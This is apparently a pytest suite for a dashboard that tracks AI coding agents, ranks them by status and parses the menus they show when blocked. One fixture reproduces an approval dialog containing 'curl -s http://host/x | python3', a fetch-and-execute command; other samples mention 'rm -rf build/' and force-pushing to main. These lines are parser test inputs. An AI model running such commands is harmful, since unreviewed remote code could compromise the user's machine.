"""Model tests, driven entirely by the captured fixture — no socket, no subprocess."""

import copy
import itertools
import re
from collections.abc import Sequence
from pathlib import Path

import pytest
from pydantic import JsonValue, TypeAdapter, ValidationError

from herdr_pwa.engine import (
    Agent,
    AgentStatus,
    BlockedPrompt,
    KeyHint,
    MenuShape,
    PaneId,
    Presence,
    SessionId,
    Snapshot,
    as_pane_id,
    as_session_id,
    rank,
)
from herdr_pwa.panetext import printed_whole
from herdr_pwa.protocol import EXPECTED_PROTOCOL
from tests.engine_seam import is_key_hint

FIXTURE = Path(__file__).parent / "fixtures" / "snapshot.example.json"


def _obj(value: JsonValue) -> dict[str, JsonValue]:
    assert isinstance(value, dict)
    return value


def _objects(value: JsonValue) -> list[dict[str, JsonValue]]:
    return [item for item in value if isinstance(item, dict)] if isinstance(value, list) else []


def _agents(raw: dict[str, JsonValue]) -> list[dict[str, JsonValue]]:
    return _objects(raw["agents"])


def _workspaces(raw: dict[str, JsonValue]) -> list[dict[str, JsonValue]]:
    return _objects(raw["workspaces"])


def _with(raw: dict[str, JsonValue], key: str, items: Sequence[JsonValue]) -> dict[str, JsonValue]:
    return {**raw, key: list(items)}


@pytest.fixture(scope="module")
def raw_snapshot() -> dict[str, JsonValue]:
    payload = _obj(TypeAdapter(JsonValue).validate_json(FIXTURE.read_text()))
    return _obj(_obj(payload["result"])["snapshot"])


@pytest.fixture(scope="module")
def snap(raw_snapshot: dict[str, JsonValue]) -> Snapshot:
    return Snapshot.from_raw(raw_snapshot)


# rank
def test_rank_pins_the_full_urgency_order() -> None:
    """Order comes from herdr 0.8.0 semantics, not from lifecycle progress."""
    assert [rank(s) for s in ("blocked", "done", "working", "idle", "unknown")] == [
        0,
        1,
        2,
        3,
        4,
    ]
    assert rank("done") < rank("working") < rank("idle")


def test_rank_accepts_enum_and_unknown_strings() -> None:
    assert rank(AgentStatus.BLOCKED) == 0
    # A status invented upstream must degrade, not explode.
    assert rank("teleporting") == 4
    assert rank(None) == 4


def test_status_coercion_is_case_insensitive() -> None:
    assert AgentStatus.coerce("BLOCKED") is AgentStatus.BLOCKED
    assert AgentStatus.coerce(" working ") is AgentStatus.WORKING


# Agent normalization
def test_agent_normalizes_the_fixture_fields(raw_snapshot: dict[str, JsonValue]) -> None:
    raw = _agents(raw_snapshot)[0]
    workspaces = {w.workspace_id: w for w in Snapshot.from_raw(raw_snapshot).workspaces}
    a = Agent.from_raw(raw, workspaces)
    assert a.target == "w652ae557d5b9c1:p2"
    assert a.session == "5b609dba-d756-493a-a3fc-b4e09bf0a183"
    assert a.title == "Compare the feed with the design rubric"
    assert a.status is AgentStatus.IDLE
    assert a.agent == "claude"
    assert a.cwd == "/home/user/projects/herdr-pwa"
    assert a.workspace == "herdr-pwa"  # joined from workspaces[] by workspace_id
    assert a.workspace_id == "w652ae557d5b9c1"
    assert a.focused is False
    assert a.rank == 3  # idle
    assert a.project == "herdr-pwa"


def test_title_uses_the_stripped_variant(
    raw_snapshot: dict[str, JsonValue], snap: Snapshot
) -> None:
    # terminal_title carries a spinner/status glyph; the stripped one is the label.
    for agent in snap.agents:
        assert not agent.title.startswith("✳")
    # One fixture title still carries a glyph after stripping, so a local re-strip would disagree with the runner.
    expected = {a["pane_id"]: str(a["terminal_title_stripped"]) for a in _agents(raw_snapshot)}
    assert {a.target: a.title for a in snap.agents} == expected
    assert any(t.startswith("◐") for t in expected.values())


# what to call this pane
def _named(**fields: object) -> Agent:
    """One agents[] entry with a generated terminal title and nothing chosen."""
    raw: dict[str, object] = {
        "pane_id": "w1:p3",
        "terminal_title": "\u25d0 Pane read timings and worktree setup",
        "terminal_title_stripped": "Pane read timings and worktree setup",
    }
    raw.update(fields)
    return Agent.from_raw(raw)


def test_a_pane_a_human_renamed_is_called_what_they_typed() -> None:
    """`pane rename` writes panes[].label, which only the join can see."""
    snap = Snapshot.from_raw(
        {
            "agents": [
                {
                    "pane_id": "w1:p3",
                    "terminal_title_stripped": "Pane read timings and worktree setup",
                    "name": "orch-herdr-pwa",
                }
            ],
            "panes": [{"pane_id": "w1:p3", "label": "the orchestrator"}],
        }
    )
    assert [a.title for a in snap.agents] == ["the orchestrator"]


def test_the_pane_join_is_by_id_not_position() -> None:
    """Two panes, one label: it must land on the pane that owns it."""
    snap = Snapshot.from_raw(
        {
            "agents": [{"pane_id": "w1:pA"}, {"pane_id": "w1:pB"}],
            "panes": [
                {"pane_id": "w1:pB", "label": "second"},
                {"pane_id": "w1:pA", "label": "first"},
            ],
        }
    )
    assert {a.target: a.title for a in snap.agents} == {
        "w1:pA": "first",
        "w1:pB": "second",
    }


def test_the_shared_title_channel_outranks_the_agent_name() -> None:
    """`report-metadata --title` is the later claim, by a human OR an agent."""
    assert _named(title="what it is doing now", name="job-259").title == ("what it is doing now")


def test_a_worker_is_called_by_the_name_it_was_dispatched_under() -> None:
    """The reported cost: every worker has a name and the phone showed none."""
    assert _named(name="job-259").title == "job-259"


def test_a_generated_terminal_title_is_the_last_resort_not_the_first() -> None:
    assert _named().title == "Pane read timings and worktree setup"


def test_a_chosen_name_is_not_worse_for_being_longer() -> None:
    """The trap. min-by-length is the terminal tie-break and stays down there."""
    assert _named(name="job-259 orchestrator for the herdr-pwa backlog").title == (
        "job-259 orchestrator for the herdr-pwa backlog"
    )


def test_the_two_terminal_variants_still_tie_break_by_length() -> None:
    """Unchanged below the fallback: the stripped spelling wins on length."""
    assert _named(terminal_title_stripped=None).title == (
        "\u25d0 Pane read timings and worktree setup"
    )


def test_a_name_that_is_only_whitespace_is_not_a_name() -> None:
    assert _named(label="   ", title="", name="  \t ").title == (
        "Pane read timings and worktree setup"
    )


def test_a_pane_with_no_name_anywhere_is_still_a_card() -> None:
    assert Agent.from_raw({"pane_id": "w9:p1"}).title == ""


def test_the_title_channel_is_read_from_either_array() -> None:
    """It lands in both at once; a snapshot that carries only panes[] still counts."""
    snap = Snapshot.from_raw(
        {
            "agents": [{"pane_id": "w1:p3", "name": "job-259"}],
            "panes": [{"pane_id": "w1:p3", "title": "PROBE-TITLE"}],
        }
    )
    assert [a.title for a in snap.agents] == ["PROBE-TITLE"]


def test_identity_is_the_session_uuid_not_the_pane(
    raw_snapshot: dict[str, JsonValue], snap: Snapshot
) -> None:
    sessions = [a.session for a in snap.agents]
    assert all(len(s) == 36 for s in sessions)
    assert len(set(sessions)) == len(sessions)
    # The transcript reader uses this string as a filename, so any re-casing breaks lookup.
    expected = {a["pane_id"]: _obj(a["agent_session"])["value"] for a in _agents(raw_snapshot)}
    assert {a.target: a.session for a in snap.agents} == expected
    # ...and never the address.
    assert not any(a.session == a.target for a in snap.agents)


def test_workspace_join_is_by_id_not_position(raw_snapshot: dict[str, JsonValue]) -> None:
    shuffled = _with(raw_snapshot, "workspaces", list(reversed(_workspaces(raw_snapshot))))
    a = Snapshot.from_raw(shuffled).by_target(PaneId("w1:p3"))
    assert a is not None
    assert a.workspace == "opencode"


def test_agent_tolerates_a_sparse_entry() -> None:
    a = Agent.from_raw({"pane_id": "w9:p1"})
    assert a.target == "w9:p1"
    assert a.session == ""
    assert a.status is AgentStatus.UNKNOWN
    assert a.rank == 4


def test_agent_is_frozen(snap: Snapshot) -> None:
    with pytest.raises(ValidationError):
        snap.agents[0].title = "nope"


# Snapshot
def test_snapshot_parses_the_fixture(snap: Snapshot) -> None:
    assert snap.protocol == EXPECTED_PROTOCOL == 22
    assert snap.version == "0.9.0"
    assert len(snap.agents) == 6
    assert len(snap.workspaces) == 5
    assert snap.focused_pane_id == "w1:p3"
    assert snap.protocol == snap.expected_protocol


def test_agents_come_out_ranked_most_urgent_first(snap: Snapshot) -> None:
    ranks = [a.rank for a in snap.agents]
    assert ranks == sorted(ranks)
    # No blocked or done agent in the fixture, so the working one sorts first.
    assert snap.agents[0].status is AgentStatus.WORKING
    assert snap.agents[-1].status is AgentStatus.IDLE


def test_a_done_agent_sorts_above_the_idle_ones(raw_snapshot: dict[str, JsonValue]) -> None:
    mutated = copy.deepcopy(raw_snapshot)
    _agents(mutated)[3]["agent_status"] = "done"
    done_target = _agents(mutated)[3]["pane_id"]
    s = Snapshot.from_raw(mutated)
    assert s.agents[0].target == done_target


def test_a_blocked_agent_sorts_above_a_working_one(raw_snapshot: dict[str, JsonValue]) -> None:
    mutated = copy.deepcopy(raw_snapshot)
    _agents(mutated)[-1]["agent_status"] = "blocked"
    blocked_target = _agents(mutated)[-1]["pane_id"]
    s = Snapshot.from_raw(mutated)
    assert s.agents[0].target == blocked_target
    assert [a.target for a in s.blocked] == [blocked_target]


def test_sort_is_deterministic_regardless_of_input_order(
    raw_snapshot: dict[str, JsonValue],
) -> None:
    reversed_raw = _with(raw_snapshot, "agents", list(reversed(_agents(raw_snapshot))))
    assert [a.target for a in Snapshot.from_raw(reversed_raw).agents] == [
        a.target for a in Snapshot.from_raw(raw_snapshot).agents
    ]


def test_counts_cover_every_status(snap: Snapshot) -> None:
    counts = snap.counts
    assert set(counts) == set(AgentStatus)
    assert counts[AgentStatus.IDLE] == 5
    assert counts[AgentStatus.WORKING] == 1
    assert counts[AgentStatus.BLOCKED] == 0
    assert sum(counts.values()) == len(snap.agents)


def test_lookup_by_session_and_target(snap: Snapshot) -> None:
    a = snap.agents[0]
    assert snap.by_session(a.session) is a
    assert snap.by_target(a.target) is a
    assert snap.by_session(SessionId("00000000-0000-0000-0000-000000000000")) is None
    assert snap.by_target(PaneId("w404:p404")) is None


def test_empty_session_is_a_valid_snapshot_not_an_error() -> None:
    """An idle box is a normal answer, not an error — and the header still renders."""
    s = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "version": "0.8.2",
            "agents": [],
            "workspaces": [],
        }
    )
    assert s.agents == ()
    assert s.blocked == ()
    assert s.protocol == EXPECTED_PROTOCOL
    assert s.version == "0.8.2"
    assert s.expected_protocol == EXPECTED_PROTOCOL
    assert s.counts == dict.fromkeys(AgentStatus, 0)
    # A missing key is not a crash either: no agents, no workspaces, no join.
    assert Snapshot.from_raw({}).agents == ()


def test_protocol_drift_is_visible_on_the_model() -> None:
    drifted = EXPECTED_PROTOCOL + 1
    s = Snapshot.from_raw({"protocol": drifted, "agents": [], "workspaces": []})
    assert s.protocol != s.expected_protocol


# BlockedPrompt

# Trimmed from a real detection capture: whole viewport, a rule, a marker, indented descriptions.
LIVE_BLOCKED = """\
\u23bf  Backgrounded agent (\u2193 to manage \u00b7 ctrl+o to expand)

\u25cf Five agents are running. Two of the ready tickets touch things outside the repo:
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
\u2190  \u2612 Docs  \u2610 Hooks  \u2714 Submit  \u2192

Hooks: fix provider coverage: opencode is outdated and cursor is not installed,
so status for those agents may be wrong or absent.

\u276f 1. Install both, then verify (Recommended)
     Reinstall opencode to v9 and install the cursor hook.
  2. Claude only \u2014 document the limitation
     Leave the other providers alone entirely.
  3. Just the opencode upgrade
  4. Type something.
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
  5. Chat about this

Enter to select \u00b7 Tab/Arrow keys to navigate \u00b7 Esc to cancel
"""


def test_blocked_prompt_parses_a_real_capture() -> None:
    p = BlockedPrompt.parse(
        LIVE_BLOCKED, target=as_pane_id("w1:p3"), session=as_session_id("sess-1")
    )
    assert p.target == "w1:p3"
    assert p.session == "sess-1"
    assert p.is_choice is True
    # The marker is stripped, descriptions are not options, and an option after a divider is found.
    assert [(o.number, o.label) for o in p.options] == [
        (1, "Install both, then verify (Recommended)"),
        (2, "Claude only \u2014 document the limitation"),
        (3, "Just the opencode upgrade"),
        (4, "Type something."),
        (5, "Chat about this"),
    ]
    # The question is the last paragraph before the options, not the whole viewport.
    assert p.question.startswith("Hooks: fix provider coverage")
    assert "Backgrounded agent" not in p.question
    assert p.raw == LIVE_BLOCKED


def test_an_uncorroborated_numbered_run_is_not_a_menu() -> None:
    """The synthetic fixture that used to drive the safety trade, inverted."""
    menu = "Run `rm -rf build/`?\n\n1. Yes\n2. No\n"
    p = BlockedPrompt.parse(menu, target=as_pane_id("w1:p5"), session=as_session_id("abc"))
    assert p.question == "Run `rm -rf build/`?"
    assert p.corroborated is False
    assert p.shape is MenuShape.NONE
    assert p.options == ()
    assert p.is_choice is False


def test_a_footer_alone_no_longer_corroborates_a_run() -> None:
    """Half of the "either signal" rule is withdrawn, on purpose."""
    menu = "Run `rm -rf build/`?\n\n1. Yes\n2. No\n\nEnter to select · Esc to cancel\n"
    p = BlockedPrompt.parse(menu)
    assert p.options == ()
    assert p.shape is MenuShape.UNKNOWN, "live, and not a menu we can drive"
    assert p.question == "Run `rm -rf build/`?", "still shown, still not tappable"


def test_the_same_menu_with_the_footer_a_real_one_carries_does_parse() -> None:
    """The control for the test above: add what every real capture has, and it parses."""
    menu = "Run `rm -rf build/`?\n\n\u276f 1. Yes\n  2. No\n\nEnter to select · Esc to cancel\n"
    p = BlockedPrompt.parse(menu)
    assert p.is_choice is True
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2]
    # And the keys offered are the ones the footer printed. No digit anywhere.
    assert [(h.key, h.verb) for h in p.hints] == [
        ("enter", "select"),
        ("esc", "cancel"),
    ]


@pytest.mark.parametrize("cursor", ["\u276f", ">", "▸", "▶", "‣"])
def test_every_cursor_glyph_reads_as_a_menu_row_and_not_only_as_a_cursor(
    cursor: str,
) -> None:
    """`_MARKER_RE` and `OPTION_RE` must agree on what a cursor looks like."""
    p = BlockedPrompt.parse(f"Proceed?\n\n{cursor} 1. Yes\n  2. No\n")
    assert [o.number for o in p.options] == [1, 2], "the cursor row is an option"
    assert [o.label for o in p.options] == ["Yes", "No"], "and it is not eaten"
    assert p.corroborated is True
    assert p.shape is MenuShape.SINGLE_CHOICE


def test_a_bracketed_number_is_a_row_too() -> None:
    p = BlockedPrompt.parse("Proceed?\n\n\u276f [1] Yes\n  [2] No\n")
    assert [(o.number, o.label) for o in p.options] == [(1, "Yes"), (2, "No")]
    assert p.shape is MenuShape.SINGLE_CHOICE


@pytest.mark.parametrize("rows", ["[1. Yes\n  [2. No", "1] Yes\n  2] No", "[1) Yes\n  [2) No"])
def test_a_half_bracketed_number_is_not_a_row(rows: str) -> None:
    assert BlockedPrompt.parse(f"Proceed?\n\n\u276f {rows}\n").options == ()


HERMES_CLARIFY = (
    "  \u250a \u2753 preparing clarify\u2026\n"
    "\u256d\u2500 Hermes needs your input \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n"
    "\u2502 1 questions                            \u2502\n"
    "\u2502 \u25b8 Which database should I migrate first? \u2502\n"
    "\u2502   \u276f 1. users (Recommended)              \u2502\n"
    "\u2502     2. orders                           \u2502\n"
    "\u2502     3. invoices                         \u2502\n"
    "\u2502     4. Other (type your answer)         \u2502\n"
    "\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n"
    "\n"
    "  \u2753 clarify  ( 11.0s \u00b7 \u2193 36 tok)\n"
    "  \u2191/\u2193 to select, Enter to lock, Tab next question  (108s)\n"
    " \u2695 GLM-5.3-Flash \u2502 13.7K/1M \u2502 \u25f7 1.3s\n"
    "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
    "? \u276f\n"
    "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
)


def test_a_hermes_clarify_dialog_is_read_and_answerable() -> None:
    """Before `_panel_screen` this parsed to question `'? \u276f'` and no options."""
    p = BlockedPrompt.parse(HERMES_CLARIFY)

    assert [o.number for o in p.options] == [1, 2, 3, 4]
    assert [o.label for o in p.options] == [
        "users (Recommended)",
        "orders",
        "invoices",
        "Other (type your answer)",
    ]
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert p.corroborated is True
    assert "Which database should I migrate first?" in p.question


def test_the_hermes_footer_is_read_through_its_commas() -> None:
    """`↑/↓ to select, Enter to lock` -- commas separate whole hints here."""
    p = BlockedPrompt.parse(HERMES_CLARIFY)
    assert ("enter", "lock") in [(h.key, h.verb) for h in p.hints]
    assert ("up", "select") in [(h.key, h.verb) for h in p.hints]


def test_a_panel_is_only_the_screen_when_it_holds_a_numbered_run() -> None:
    """A drawn box with no menu in it must not narrow anything."""
    boxed_prose = (
        "\u256d\u2500 Notice \u2500\u2500\u2500\u2500\u2500\u256e\n"
        "\u2502 all done  \u2502\n"
        "\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n"
        "\nProceed?\n\n\u276f 1. Yes\n  2. No\n"
    )
    p = BlockedPrompt.parse(boxed_prose)
    assert [o.number for o in p.options] == [1, 2], "the real menu below still wins"


HERMES_APPROVAL = (
    "\u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n"
    "\u2502 \u26a0\ufe0f  Dangerous Command          \u2502\n"
    "\u2502                                \u2502\n"
    "\u2502 curl -s http://host/x | python3 \u2502\n"
    "\u2502 \u2026 (choose Show full command)   \u2502\n"
    "\u2502                                \u2502\n"
    "\u2502 \u276f 1. Allow once                \u2502\n"
    "\u2502   2. Allow for this session     \u2502\n"
    "\u2502   3. Add to permanent allowlist \u2502\n"
    "\u2502   4. Deny                       \u2502\n"
    "\u2502   5. Show full command          \u2502\n"
    "\u2502                                \u2502\n"
    "\u2502 Security scan \u2014 [HIGH] Pipe to  \u2502\n"
    "\u2502 interpreter: downloaded content \u2502\n"
    "\u2502 will be executed without review \u2502\n"
    "\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n"
    "\n"
    "  \u2191/\u2193 to select, Enter to confirm  (36s)\n"
)


def test_options_in_the_middle_of_a_panel_are_still_the_menu() -> None:
    """A dialog may explain itself BELOW its options and still be a dialog."""
    p = BlockedPrompt.parse(HERMES_APPROVAL)

    assert [o.number for o in p.options] == [1, 2, 3, 4, 5]
    assert [o.label for o in p.options][:2] == ["Allow once", "Allow for this session"]
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert p.corroborated is True


def test_a_countdown_after_a_hint_is_not_part_of_its_verb() -> None:
    """`Enter to confirm (36s)` -- the timer is chrome and broke the whole hint."""
    p = BlockedPrompt.parse(HERMES_APPROVAL)
    assert ("enter", "confirm") in [(h.key, h.verb) for h in p.hints]


def test_a_hint_line_is_not_read_as_one_hint_whose_keys_are_a_verb() -> None:
    """The line matches `_HINT_RE` WHOLE, and that whole match is wrong."""
    both = [(h.key, h.verb) for h in BlockedPrompt.parse(HERMES_APPROVAL).hints]
    assert ("up", "select") in both
    assert ("down", "select") in both
    assert not any(verb != "select" for key, verb in both if key in {"up", "down"})


def test_a_marker_corroborates_a_menu_with_no_footer() -> None:
    """The other positive signal: a terminal only draws a cursor where something is live."""
    p = BlockedPrompt.parse("Proceed?\n\n\u276f 1. Yes\n  2. No\n")
    assert p.corroborated is True
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2]
    # Nothing was printed, so nothing is offered beyond the generic keypad.
    assert p.hints == ()


def test_blocked_prompt_handles_selection_markers_and_parens() -> None:
    # A run earns SINGLE_CHOICE under a question or an "Enter to select", never by default.
    p = BlockedPrompt.parse("Pick one?\n> 1) alpha\n  2) beta\n")
    assert p.question == "Pick one?"
    assert [(o.number, o.label) for o in p.options] == [(1, "alpha"), (2, "beta")]


def test_free_text_prompt_keeps_the_text_as_the_question() -> None:
    p = BlockedPrompt.parse("What should I name the branch?\n")
    assert p.options == ()
    assert p.is_choice is False
    assert p.question == "What should I name the branch?"


def test_blocked_prompt_on_empty_output_is_harmless() -> None:
    p = BlockedPrompt.parse("")
    assert p.question == ""
    assert p.options == ()


# BlockedPrompt: the trailing-menu anchor

# Detection returns the whole viewport, so a numbered recap above the real question must not become options.
TRANSCRIPT_THEN_QUESTION = (
    "I ran the following steps:\n"
    "1. installed deps\n"
    "2. ran the tests\n"
    "\n"
    "Should I force-push to main?\n"
)


def test_prior_transcript_never_becomes_tap_targets() -> None:
    p = BlockedPrompt.parse(
        TRANSCRIPT_THEN_QUESTION, target=as_pane_id("w1:p3"), session=as_session_id("s")
    )
    assert p.options == ()
    assert p.is_choice is False  # generic keypad, not two wrong buttons
    # And the real question — the one after the numbered recap — is what shows.
    assert p.question == "Should I force-push to main?"
    assert p.raw == TRANSCRIPT_THEN_QUESTION


def test_a_numbered_list_with_no_menu_is_not_a_choice() -> None:
    text = (
        "Here is what I changed:\n"
        "1. bumped the pin\n"
        "2. regenerated the lockfile\n"
        "3. reran the suite\n"
        "\n"
        "All green. Anything else you want me to look at?\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.is_choice is False
    assert p.question == "All green. Anything else you want me to look at?"


def test_options_that_do_not_start_at_one_are_not_a_menu() -> None:
    # A menu always offers a "1", so a run numbered from 2 is not confidently a menu.
    p = BlockedPrompt.parse("Remaining work:\n2. rebase\n3. push\n")
    assert p.is_choice is False
    assert p.options == ()


def test_a_lone_trailing_number_is_not_a_menu() -> None:
    p = BlockedPrompt.parse("Next up:\n1. rerun the failing test\n")
    assert p.is_choice is False


def test_a_non_numbered_marker_menu_falls_back_to_free_text() -> None:
    # A marker-only yes/no menu has no keystroke to derive, so the generic keypad drives it.
    text = (
        "Do you want to proceed with the migration?\n"
        "\u276f Yes\n"
        "  No, tell Claude what to do differently\n"
        "\n"
        "Enter to select · Esc to cancel\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.is_choice is False
    assert p.options == ()
    assert p.question.startswith("Do you want to proceed with the migration?")


def test_a_menu_after_a_numbered_transcript_still_parses() -> None:
    # Both shapes in one viewport: only the trailing run counts, and the question precedes it.
    text = (
        "I ran the following steps:\n"
        "1. installed deps\n"
        "2. ran the tests\n"
        "\n"
        "Should I force-push to main?\n"
        "\n"
        "\u276f 1. Yes, force-push\n"
        "  2. No, open a PR instead\n"
        "\n"
        "Enter to select · Esc to cancel\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.is_choice is True
    assert p.question == "Should I force-push to main?"
    assert [(o.number, o.label) for o in p.options] == [
        (1, "Yes, force-push"),
        (2, "No, open a PR instead"),
    ]


def test_menu_is_rejected_when_prose_interrupts_the_run() -> None:
    text = (
        "Pick one:\n"
        "1. keep going\n"
        "That was the plan I had before you interrupted me.\n"
        "2. stop here\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.is_choice is False


# identity robustness
def test_empty_session_never_resolves_to_an_agent() -> None:
    """A sessionless agent must not answer to the empty session."""
    s = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {"pane_id": "w1:p1", "agent_status": "blocked"},
                {"pane_id": "w2:p1", "agent_status": "blocked"},
            ],
            "workspaces": [],
        }
    )
    assert [a.session for a in s.agents] == ["", ""]  # both sessionless
    assert s.by_session(SessionId("")) is None
    assert s.by_session(SessionId("   ")) is None
    assert s.by_target(PaneId("")) is None


def test_a_flattened_agent_session_degrades_instead_of_exploding() -> None:
    """Protocol drift must not raise: a read path that explodes has no fallback."""
    a = Agent.from_raw({"pane_id": "w9:p1", "agent_session": "sess-abc", "agent": "claude"})
    assert a.session == "sess-abc"
    assert a.agent == "claude"


def test_a_nonsense_agent_session_leaves_the_agent_sessionless() -> None:
    for junk in (12345, ["a"], True, None):
        a = Agent.from_raw({"pane_id": "w9:p1", "agent_session": junk})
        assert a.session == ""
        assert a.target == "w9:p1"


def test_whitespace_only_session_normalizes_to_empty() -> None:
    a = Agent.from_raw({"pane_id": "w9:p1", "agent_session": {"value": "   "}})
    assert a.session == ""


# normalization: every field, not just the ones that were easy
def test_every_agent_in_the_fixture_is_fully_populated(
    raw_snapshot: dict[str, JsonValue], snap: Snapshot
) -> None:
    """The count is right and no card would render a hole."""
    assert len(snap.agents) == len(_agents(raw_snapshot)) == 6
    for a in snap.agents:
        assert a.session, "identity is what everything downstream keys on"
        assert a.target, "address is what the runner is driven by"
        assert a.title
        assert a.agent == "claude"
        assert a.cwd.startswith("/")
        assert a.foreground_cwd.startswith("/")
        assert a.workspace, "the workspace label must be joined, not blank"
        assert a.workspace_id
        assert a.workspace_number is not None
        assert a.project
        assert a.status in set(AgentStatus)
        assert a.revision >= 1


def test_foreground_cwd_falls_back_to_cwd() -> None:
    # The runner omits foreground_cwd when nothing runs in the pane; a blank would show no project.
    a = Agent.from_raw({"pane_id": "w9:p1", "cwd": "/home/user/projects/herdr-pwa"})
    assert a.foreground_cwd == "/home/user/projects/herdr-pwa"
    assert a.project == "herdr-pwa"


def test_the_whole_workspace_join_is_by_id_not_position(raw_snapshot: dict[str, JsonValue]) -> None:
    """Every agent's label *and* number come from its own workspace entry."""
    by_id = {str(w["workspace_id"]): w for w in _workspaces(raw_snapshot)}
    expected = {
        a["pane_id"]: (
            by_id[str(a["workspace_id"])]["label"],
            by_id[str(a["workspace_id"])]["number"],
        )
        for a in _agents(raw_snapshot)
    }
    assert len(set(expected.values())) > 1  # a positional join would be detectable

    for workspaces in (
        _workspaces(raw_snapshot),
        list(reversed(_workspaces(raw_snapshot))),
    ):
        s = Snapshot.from_raw(_with(raw_snapshot, "workspaces", workspaces))
        assert {a.target: (a.workspace, a.workspace_number) for a in s.agents} == expected


def test_an_agent_in_an_unknown_workspace_still_renders(raw_snapshot: dict[str, JsonValue]) -> None:
    # A workspace closed mid-snapshot: the join misses and must degrade to a blank label.
    s = Snapshot.from_raw(_with(raw_snapshot, "workspaces", []))
    assert len(s.agents) == 6
    assert {a.workspace for a in s.agents} == {""}
    assert {a.workspace_number for a in s.agents} == {None}


# ranking: the full order, pinned end to end
def _synthetic(*statuses: str) -> Snapshot:
    """A snapshot with one agent per given status, in the order given."""
    return Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {
                    "pane_id": f"w{i}:p1",
                    "agent_status": status,
                    "agent_session": {"value": f"{i:08d}-0000-4000-8000-000000000000"},
                }
                for i, status in enumerate(statuses)
            ],
            "workspaces": [],
        }
    )


def test_the_feed_orders_all_five_states_at_once() -> None:
    """blocked < done < idle < working < unknown, proved on one snapshot."""
    s = _synthetic("working", "unknown", "idle", "blocked", "done")
    assert [a.status for a in s.agents] == [
        AgentStatus.BLOCKED,
        AgentStatus.DONE,
        AgentStatus.WORKING,
        AgentStatus.IDLE,
        AgentStatus.UNKNOWN,
    ]
    assert [a.rank for a in s.agents] == [0, 1, 2, 3, 4]


def test_an_unrecognised_status_sorts_last_and_never_first() -> None:
    """A status invented upstream must degrade to the bottom of the feed."""
    s = _synthetic("blocked", "teleporting", "done", "", "idle")
    assert [a.status for a in s.agents] == [
        AgentStatus.BLOCKED,
        AgentStatus.DONE,
        AgentStatus.IDLE,
        AgentStatus.UNKNOWN,
        AgentStatus.UNKNOWN,
    ]  # no working agent here; idle is the last of the known states
    assert s.agents[0].status is AgentStatus.BLOCKED
    assert rank("teleporting") == max(rank(s) for s in AgentStatus) == 4


def test_ties_break_on_workspace_then_pane_not_on_arrival_order() -> None:
    raw = {
        "protocol": EXPECTED_PROTOCOL,
        "agents": [
            {"pane_id": "w2:p9", "agent_status": "idle", "workspace_id": "w2"},
            {"pane_id": "w1:p2", "agent_status": "idle", "workspace_id": "w1"},
            {"pane_id": "w1:p1", "agent_status": "idle", "workspace_id": "w1"},
        ],
        "workspaces": [
            {"workspace_id": "w1", "label": "one", "number": 1},
            {"workspace_id": "w2", "label": "two", "number": 2},
        ],
    }
    assert [a.target for a in Snapshot.from_raw(raw).agents] == [
        "w1:p1",
        "w1:p2",
        "w2:p9",
    ]


# recency: , within a rank only
def _by_seq(*agents: tuple[str, str, int]) -> Snapshot:
    """A snapshot of ``(pane, status, state_change_seq)`` agents, one workspace each."""
    return Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {
                    "pane_id": pane,
                    "agent_status": status,
                    "workspace_id": "w1",
                    "state_change_seq": seq,
                }
                for pane, status, seq in agents
            ],
            "workspaces": [{"workspace_id": "w1", "label": "one", "number": 1}],
        }
    )


def test_the_idle_agent_that_changed_most_recently_comes_first() -> None:
    """What was raised for: two idle agents, the fresher one on top."""
    s = _by_seq(("w1:p1", "idle", 4), ("w1:p9", "idle", 91))
    assert [a.target for a in s.agents] == ["w1:p9", "w1:p1"]


def test_a_stale_blocked_agent_still_outranks_a_fresh_idle_one() -> None:
    """Recency must never move an agent between ranks."""
    s = _by_seq(("w1:p1", "blocked", 1), ("w1:p9", "idle", 900))
    assert [a.status for a in s.agents] == [AgentStatus.BLOCKED, AgentStatus.IDLE]
    assert s.agents[0].target == "w1:p1"


def test_recency_outranks_workspace_and_pane_but_only_within_a_rank() -> None:
    """The full order: rank first, then recency, and position only to break a tie."""
    s = _by_seq(
        ("w1:p1", "working", 99),
        ("w1:p2", "idle", 2),
        ("w1:p3", "idle", 50),
        ("w1:p4", "blocked", 1),
    )
